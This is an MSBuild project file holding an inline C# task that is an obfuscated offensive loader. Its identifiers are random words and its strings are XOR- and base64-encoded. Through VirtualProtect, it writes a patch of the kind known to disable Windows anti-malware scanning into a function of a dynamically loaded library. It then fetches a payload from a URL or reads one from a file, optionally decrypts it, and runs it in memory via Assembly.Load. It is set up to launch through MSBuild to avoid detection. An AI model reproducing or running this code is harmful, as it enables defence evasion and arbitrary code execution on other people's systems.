<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
	      <![CDATA[	  

using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ChrysoeriolPillars{    private static object[] HydroaericBandsmen = null;
	[DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr AchatourSirrees, UIntPtr DecodersSclerotia, uint DisappointedPolyribosome, out uint ElectrocatalyticBertolonia);
	[DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr LaighJudicatio, string UnleasedBesoot);
	[DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string UnbarricadePrinked);
	private static bool UnpreferablenessUnhinderable(ConsoleKey UnipotentialNonaffilliated)
    {
        if (UnipotentialNonaffilliated == ConsoleKey.X)
            Environment.Exit(0);
        return (UnipotentialNonaffilliated == ConsoleKey.Y);
    }
	private static Type TelotrochalAbdominalia(MethodInfo HeteropetalousTorrentuous)
    {
        return HeteropetalousTorrentuous.ReflectedType;
    }
	private static IntPtr ConnectionsPolypetalae(IntPtr ModalitiesUprisers)
    {
        uint ShieldtailUnreflective = 0;
        if (VirtualProtect(ModalitiesUprisers, (UIntPtr)ReinflationTitanically().Length, 0x40, out ShieldtailUnreflective))
        {
            return ModalitiesUprisers;
        }
        else
        {
            return (IntPtr)0;
        }
    }
	private static byte[] ReinflationTitanically()
    {
        if (MicroblephariaMonoflagellate())
            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    }
	private static Assembly OutporterPlumist(byte[] DegradandMontabyn)
    {
        return Assembly.Load(DegradandMontabyn);
    }
	private static MethodInfo GyrographConstituted(Assembly asm)
    {
        return asm.EntryPoint;
    }
	private static string SchappeOuttore(string PalaeogenesisMotorable, bool TatpurushaStablishment)
    {
        if (TatpurushaStablishment)
            PalaeogenesisMotorable = Encoding.UTF8.GetString(Convert.FromBase64String(PalaeogenesisMotorable));
        if (PalaeogenesisMotorable.Trim().ToLower().Equals(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("Og=="), "BasiarachnoiditisRaggedness"))))
            Environment.Exit(0);
        return PalaeogenesisMotorable;
    }
	private static void HabbeCobego()
    {
        IntPtr ModalitiesUprisers = ConnectionsPolypetalae(TetradymiteRetirade());
        if (ModalitiesUprisers != (IntPtr)0)
        {
            Marshal.Copy(ReinflationTitanically(), 0, ModalitiesUprisers, ReinflationTitanically().Length);
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("F0Q6RSYYIBEQGgADOQMLHFUdIgYWARYBbC4qNjxM"), "LogeumCruise")));
        }
        else
        {
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("HlE1UjEIGQocAB0PZCQgPSBULy4nCTUs"), "EphraimitishDemnition")));
        }
    }
	private static bool MicroblephariaMonoflagellate()
    {
        if (IntPtr.Size == 4)
            return false;
        return true;
    }
	private static void ReconductReferences(string SuperorderIrrebuttable, string[] CovolumeCongregationalize, bool VermilUnsummarisableoded = false, string MaintopsailImbecilely = "", int HottieStalker = 0)
    {
        HabbeCobego();
        HelodermaAporobranchiata(HottieStalker);
        if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("dQ=="), "UndereatenGardenmaker")), CovolumeCongregationalize)))
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("CF45RDA8IkojMhwnUklF"), "SuddennessHorseshoer")) + SuperorderIrrebuttable + Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("FBwDEB8JBwAmTldP"), "UnderlitUnmonopolising")) + string.Join(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("dQ=="), "UndereatenGardenmaker")), CovolumeCongregationalize));
        else
        {
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("CF45RDA8IkojMhwnUklF"), "SuddennessHorseshoer")) + SuperorderIrrebuttable + Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("FBwDEB8JBwAmTldP"), "UnderlitUnmonopolising")) + string.Join(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("dQ=="), "UndereatenGardenmaker")), CovolumeCongregationalize));
        }
        HydroaericBandsmen = new object[] { CovolumeCongregationalize };
        if (VermilUnsummarisableoded && SuperorderIrrebuttable.ToLower().StartsWith(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("OBsYHA=="), "PollenlessPhenothiazine"))))
        {
            ArmigerPelletizer(TheophilanthropyPrereduction(SuperorderIrrebuttable), MaintopsailImbecilely);
        }
        else if (!VermilUnsummarisableoded && SuperorderIrrebuttable.ToLower().StartsWith(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("OBsYHA=="), "PollenlessPhenothiazine"))))
        {
            DisequalityEpiscopalism(TheophilanthropyPrereduction(SuperorderIrrebuttable));
        }
        else if (!VermilUnsummarisableoded && !SuperorderIrrebuttable.ToLower().StartsWith(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("OBsYHA=="), "PollenlessPhenothiazine"))))
            DisequalityEpiscopalism(PremiateSafeblower(SuperorderIrrebuttable, FileMode.Open));
        else
            ArmigerPelletizer(PremiateSafeblower(SuperorderIrrebuttable, FileMode.Open), MaintopsailImbecilely);
    }
	public static int HelodermaAporobranchiata(int HarianaTragicose)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)HarianaTragicose;
        return HarianaTragicose;
    }
	private static IntPtr TetradymiteRetirade()
    {
        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("JwQVHUsBAj8="), "FifteenSynclastic"))), Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("BQwBAD0EEig3FwQDFws="), "DaringsFubbery")));
    }
	private static byte[] CaeciliaeJestproof(byte[] PalaeogenesisMotorable, string TrushOdorlessly)
    {
        //byte[] keyBytes = Encoding.UTF8.GetBytes(TrushOdorlessly);
        byte[] MegassesSuperendorseBytes = new byte[PalaeogenesisMotorable.Length];
        for (int i = 0; i < PalaeogenesisMotorable.Length; i++)
        {
            MegassesSuperendorseBytes[i] = (byte)(PalaeogenesisMotorable[i] ^ Encoding.UTF8.GetBytes(TrushOdorlessly)[i % Encoding.UTF8.GetBytes(TrushOdorlessly).Length]);
        }
        return MegassesSuperendorseBytes;
    }
	private static byte[] TheophilanthropyPrereduction(string url)
    {
        HttpWebRequest CloueeNonlogistical = (HttpWebRequest)WebRequest.Create(url);
        CloueeNonlogistical.Proxy.Credentials = CredentialCache.DefaultCredentials;
        CloueeNonlogistical.Method = Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("Fyo4"), "PolarizerContributiveness"));
        WebResponse MicroergSimplesse = CloueeNonlogistical.GetResponse();
        MemoryStream ms = new MemoryStream();
        MicroergSimplesse.GetResponseStream().CopyTo(ms);
        return ms.ToArray();
    }
	private static object SpringilyAffrontingly(MethodInfo HeteropetalousTorrentuous)
    {
        if (TelotrochalAbdominalia(HeteropetalousTorrentuous) == HeteropetalousTorrentuous.ReflectedType)
            return HeteropetalousTorrentuous.Invoke(null, HydroaericBandsmen);
        return HydroaericBandsmen[0];
    }
	private static void ArmigerPelletizer(byte[] UndeadlockedBarmiest, string MaintopsailImbecilely)
    {
        SpringilyAffrontingly(GyrographConstituted(OutporterPlumist(CaeciliaeJestproof(UndeadlockedBarmiest, MaintopsailImbecilely))));
    }
	private static byte[] PremiateSafeblower(string CreosoterCrizzling, FileMode ExtricatingCalapite)
    {
        byte[] MegassesSuperendorse = null;
        using (FileStream fs = new FileStream(CreosoterCrizzling, ExtricatingCalapite, FileAccess.Read))
        {
            MegassesSuperendorse = new byte[fs.Length];
            fs.Read(MegassesSuperendorse, 0, (int)fs.Length);
        }
        return MegassesSuperendorse;
    }
	public static void Main(string[] args)
    {
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("F045Rxs0HzQADhsZDlJYSRAkHBojXxxHRjwWISIGDBQAAA=="), "LodgersUnimpertinent")));
        int DermatolysisThyroepiglottidean = (Convert.ToInt32(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("YFlD"), "SawflyNoncontemptibly"))) * Convert.ToInt32(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("fw=="), "GreenletTrierarchal"))));
        string MetabularUnbronzed = "";
        string[] SelfhoodPseudotuberculous = new string[] { };
        bool AntiedemicNondistributional = false;
        bool VermilUnsummarisable = false;
        string MaintopsailImbecilely = "";
        if (args.Length > 0)
        {
            foreach (string argument in args)
            {
                if (argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("eUMSXXM="), "TnpkGulls")) || argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("Yw1VXw=="), "NockSpinnery")))
                {
                    AntiedemicNondistributional = true;
                    Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("E0I4Ui4IGUwEPw4GCQwPEx1PEhctSScTHAFDWEUoBxALDQQDQk8XACsGARsBA1UYDSgEUwsHQRMGClMDJBA="), "HieroduleMisdiagnose")));
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("bAgfFw=="), "AppendixingGrundsil")) || argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("fk4QBgg="), "SchizophyceaeReverifying")))
                {
                    VermilUnsummarisable = true;
                    int HaymishChoriambic = Array.IndexOf(args, argument) + 1;
                    if (HaymishChoriambic < args.Length)
                    {
                        string StormfullyRosin = args[HaymishChoriambic];
                        if (AntiedemicNondistributional)
                            MaintopsailImbecilely = Encoding.UTF8.GetString(Convert.FromBase64String(StormfullyRosin));
                        else
                            MaintopsailImbecilely = StormfullyRosin;
                    }
                    Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("HE4xTzAKFxocAhUZFylJNio0TwkKJBcVHwAKEEgHGw8RCzdJGxYPAQtELAAVT1MURBVC"), "GelototherapyNinefold")), MaintopsailImbecilely);
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("bgIYBBw="), "CryptousGuttera")) || argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("aUgcCAYB"), "DeliriumExcitron")))
                {
                    int HaymishChoriambic = Array.IndexOf(args, argument) + 1;
                    if (HaymishChoriambic < args.Length)
                    {
                        string NontraditionarySwitchboards = args[HaymishChoriambic];
                        if (AntiedemicNondistributional)
                            MetabularUnbronzed = Encoding.UTF8.GetString(Convert.FromBase64String(NontraditionarySwitchboards));
                        else
                            MetabularUnbronzed = NontraditionarySwitchboards;
                    }
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("bAQBExs="), "AesthesodicInvecked")) || argument.ToLower() == Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("f0gDBxQm"), "RebusUrethrotomic")))
                {
                    int DemicriticIncommodities = Array.IndexOf(args, argument) + 1;
                    int UnornamentationUnturn = args.Length - DemicriticIncommodities;
                    SelfhoodPseudotuberculous = new String[UnornamentationUnturn];
                    for (int i = 0; i < UnornamentationUnturn; i++)
                    {
                        string NontraditionarySwitchboardsArgs = args[DemicriticIncommodities + i];
                        if (AntiedemicNondistributional)
                            SelfhoodPseudotuberculous[i] = Encoding.UTF8.GetString(Convert.FromBase64String(NontraditionarySwitchboardsArgs));
                        else
                            SelfhoodPseudotuberculous[i] = NontraditionarySwitchboardsArgs;
                    }
                }
            }
            if (string.IsNullOrEmpty(MetabularUnbronzed))
            {
                TuberculomaniaNonportentous();
                Environment.Exit(0);
            }
            ReconductReferences(MetabularUnbronzed, SelfhoodPseudotuberculous, VermilUnsummarisable, MaintopsailImbecilely, DermatolysisThyroepiglottidean);
            Environment.Exit(0);
        }
        while (true)
        {
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("DVYuQyYbHgERUytFGjtOERwcUwMHEQ0GTBE5SRYbBgFP"), "ViscountessesUnpresentable")));
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("GU0yTSYGUyUDD08OAh8GB0EgExwIWUFTIQEAAAMJC1NMQTtdAU1CS1M="), "BromousDocoglossa")));
            AntiedemicNondistributional = UnpreferablenessUnhinderable(Console.ReadKey(false).Key);
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("CVo7SScLAgY2TwQTDQdQGxdSHAE+RUtXTg=="), "RefinersBotryopteris")));
            MetabularUnbronzed = SchappeOuttore(Console.ReadLine(), AntiedemicNondistributional);
            Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("D1AyVCEDQQccAGQZEhMDBg8NTgM1Gw5UMD8zUxELJxsKGhsMCklRRy1AAVRFTkE="), "ToothpasteDisjoining")));
            VermilUnsummarisable = UnpreferablenessUnhinderable(Console.ReadKey(false).Key);
            if (VermilUnsummarisable)
            {
                Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("CEo/SScdFQcAbwEcFkg5PzdzHgcQTl5bUg=="), "SubinsertOutshape")));
                MaintopsailImbecilely = SchappeOuttore(Console.ReadLine(), AntiedemicNondistributional);
            }
            Console.WriteLine("[?] Input payload args (optional) -> ");
            SelfhoodPseudotuberculous = SchappeOuttore(Console.ReadLine(), AntiedemicNondistributional).Split(' ');
            if (MetabularUnbronzed.Length > 0)
            {
                ReconductReferences(MetabularUnbronzed, SelfhoodPseudotuberculous, VermilUnsummarisable, MaintopsailImbecilely, DermatolysisThyroepiglottidean);
            }
        }
    }
	private static void DisequalityEpiscopalism(byte[] UndeadlockedBarmiest)
    {
        SpringilyAffrontingly(GyrographConstituted(OutporterPlumist(UndeadlockedBarmiest)));
    }
	private static void TuberculomaniaNonportentous()
    {
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("FhIGAgpOYQ=="), "CageotAnomalistical")));
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("HRYVAhdVQTxKDkNANE4yQyoaAVNZHxEQUDpoSAQEBgdBWwUFGxUbFzYeMwEbTUUvWQgcADtFSAcbAQAVHjMUBg4dVzM="), "HeteroagglutininRussetting")));
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("DwBMBl5bVkQqAhUdCj0eEw1DDgAENFQRBRoOAQERFxNUDD0UGwICHAULNFQVDAkbTAUJHkEbETsVAEETCR4EPhEVARocTAUXF0EWBCAVRFVDDQIGPBAEAEY="), "StadholderateSprachle")));
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("HxxECwoeX1I8PREIHBscAA5MFSIaCB4AGAAAUyQLBRoWExULAgJjHAESEUwHGx0sFxhTExsNBx9FIhoMUz0jN1IWIwYTCgUGBAZCRQ4dGgdFDgBSFSIJDRwCFwVCDhxjHAEWRTQqIFMpAAIBDAIVCwMLYwMMCks="), "ChiselersMeasurable")));
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("DwRFFRkzDVRUJAAABQ0RHCEJSBUZNQQDER0EHE9MLB03GQsEDCIWTgABBE4RDREbf1ANDAwvABxUBQ4NAABFHCFQCUUtFSlCVAYHThUEAFMxGQYECj5FGhtJDQEACEs="), "SphexGentianales")));
        Console.WriteLine(Encoding.UTF8.GetString(CaeciliaeJestproof(Convert.FromBase64String("HxtCExYOHVtUJh8aJAAcHSIDTwIFGw8MER0KHG0aARYnTxsdRBkPEgdJDhwqGh8WLRscUhAGThUcDE8CIg4WFidPDRsKCBwYWkkiGz4bUhEmTwkdCAUBFhENTww0TxMfL08OAAMcAwQaHRxOKwAAUzcHClIGAAAABhBB"), "CoordinationMors")));
    }
	    
	     //This is for MSBuild later
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {
	            ChrysoeriolPillars.Main(new string[] { });
	            return true;
	        }
	    }
	    
}

 ]]>
	</Code>	  
    </Task>
  </UsingTask>
</Project>